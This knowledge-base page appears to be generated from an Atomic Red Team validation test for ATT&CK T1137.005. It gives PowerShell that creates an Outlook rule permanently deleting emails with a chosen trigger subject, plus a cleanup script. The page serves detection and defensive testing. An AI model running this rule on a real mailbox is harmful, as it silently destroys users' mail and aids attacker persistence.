---
atomic_guid: "ffadc988-b682-4a68-bd7e-4803666be637"
title: "Outlook Rule - Subject Trigger with DeletePermanently Action via COM Object"
framework: "atomic"
generated: "true"
attack_technique_id: "T1137.005"
attack_technique_name: "Office Application Startup: Outlook Rules"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.005/T1137.005.yaml"
build_date: "2026-04-26 14:38:40"
executor: "powershell"
aliases:
  - "ffadc988-b682-4a68-bd7e-4803666be637"
  - "Outlook Rule - Subject Trigger with DeletePermanently Action via COM Object"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Outlook Rule - Subject Trigger with DeletePermanently Action via COM Object

Creates a malicious Outlook rule via the COM object that permanently deletes
emails when an email with a specific subject keyword arrives. Simulates
adversary persistence via Outlook Rules (T1137.005). Uses DeletePermanently
action as it does not require a resolved Exchange folder unlike MoveToFolder.
NOTE: olRuleActionStartApplication cannot be created programmatically per
Microsoft's Rules object model - DeletePermanently is used as the supported
equivalent that generates the same rule-creation artefact.
NOTE: This test MUST be run from a non-elevated (standard user) PowerShell
session. Outlook COM fails with 0x80080005 when invoked as Administrator.

## Metadata

- Atomic GUID: ffadc988-b682-4a68-bd7e-4803666be637
- Technique: T1137.005: Office Application Startup: Outlook Rules
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Source Path: atomics/T1137.005/T1137.005.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1137-office_application_startup|T1137.005]]

## Input Arguments

### rule_name

- description: Name for the malicious Outlook rule
- type: string
- default: AtomicTest_T1137005_SubjectTrigger

### trigger_subject

- description: Email subject keyword that triggers the rule
- type: string
- default: atomic-rt-trigger

## Dependencies

Classic Outlook must be installed (required for COM automation)

### Prerequisite Check

```text
$clsid = (Get-ItemProperty "REGISTRY::HKEY_CLASSES_ROOT\Outlook.Application\CLSID" -ErrorAction SilentlyContinue).'(Default)'
if ($clsid) { exit 0 } else { exit 1 }
```

### Get Prerequisite

```text
Write-Host "[-] Classic Outlook is not installed or COM is not registered."
Write-Host "    Install Microsoft 365 Apps with Classic Outlook before running this test."
Write-Host "    Note: The new Outlook for Windows does NOT support COM automation."
exit 1
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if ($isAdmin) {
    Write-Host "[-] This test must be run from a non-elevated PowerShell session."
    Write-Host "    Outlook COM fails with 0x80080005 when run as Administrator."
    exit 1
}

$outlook   = New-Object -ComObject Outlook.Application
$namespace = $outlook.GetNamespace("MAPI")
$rules     = $namespace.DefaultStore.GetRules()
$rule      = $rules.Create("#{rule_name}", 0)

$cond = $rule.Conditions.Subject
$cond.Enabled = $true
$cond.Text    = @("#{trigger_subject}")

$action         = $rule.Actions.DeletePermanently
$action.Enabled = $true

$rule.Enabled = $true
$rules.Save()
Write-Host "[+] Rule '#{rule_name}' created. Emails with subject '#{trigger_subject}' will be permanently deleted."
```

### Cleanup

```powershell
$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
if ($isAdmin) {
    Write-Host "[-] Cleanup must be run from a non-elevated PowerShell session. Skipping."
    exit 1
}
$outlook   = New-Object -ComObject Outlook.Application
$namespace = $outlook.GetNamespace("MAPI")
$rules     = $namespace.DefaultStore.GetRules()
$removed   = $false
for ($i = $rules.Count; $i -ge 1; $i--) {
    if ($rules.Item($i).Name -eq "#{rule_name}") {
        $rules.Remove($rules.Item($i).Name)
        $removed = $true
    }
}
if ($removed) {
    $rules.Save()
    Write-Host "[+] All instances of rule '#{rule_name}' removed."
} else {
    Write-Host "[*] Rule '#{rule_name}' not found - already removed."
}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.005/T1137.005.yaml)
